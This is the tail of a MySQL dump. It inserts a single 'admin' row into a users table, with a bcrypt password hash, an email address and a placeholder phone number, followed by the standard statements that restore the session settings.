insert  into `users`(`id`,`username`,`password`,`name`,`role`,`email`,`created_at`,`active`,`phone`,`icon_url`,`login_last_ip`,`pay_flag`) values (1,'admin','$2y$08$cWQrZkJsZHBVWDl0aG13Uu590uO7IWcY93AlFI8.MrW.K2NbM65fy','admin','admin','2022137639@qq.com','2019-02-17 14:00:02','1','13888888888',NULL,' ',0);

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
